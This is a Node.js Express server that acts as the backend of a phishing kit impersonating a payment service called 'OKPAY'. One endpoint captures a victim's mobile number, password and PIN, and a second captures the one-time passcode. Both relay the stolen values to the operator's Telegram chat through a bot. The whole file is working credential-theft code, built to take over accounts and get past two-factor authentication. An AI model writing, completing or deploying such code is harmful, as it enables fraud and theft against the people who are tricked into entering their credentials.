const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10kb' }));
app.use(express.static(__dirname));

const bot = new TelegramBot(process.env.BOT_TOKEN);

app.post('/submit-login', async (req, res) => {
  const { phone, password, pin } = req.body;
  if (!phone || !password || !pin) {
    return res.status(400).json({ success: false, message: 'All fields required.' });
  }

  const messageText = `OKPAY LOGIN\n\nMobile:📱 ${phone}\nPassword: 🔑${password}\nPin: 🧷${pin}`;

  try {
    await bot.sendMessage(process.env.CHAT_ID, messageText);
    res.json({ success: true, message: 'Login data sent.' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, message: 'Server error.' });
  }
});

app.post('/submit-otp', async (req, res) => {
  const { otp } = req.body;
  if (!otp) {
    return res.status(400).json({ success: false, message: 'OTP required.' });
  }

  const messageText = `OKPAY OTP\n\nReceived OTP:🛂 ${otp}`;

  try {
    await bot.sendMessage(process.env.CHAT_ID, messageText);
    res.json({ success: true, message: 'OTP sent.' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, message: 'Server error.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running successfully on port ${PORT}`);
});
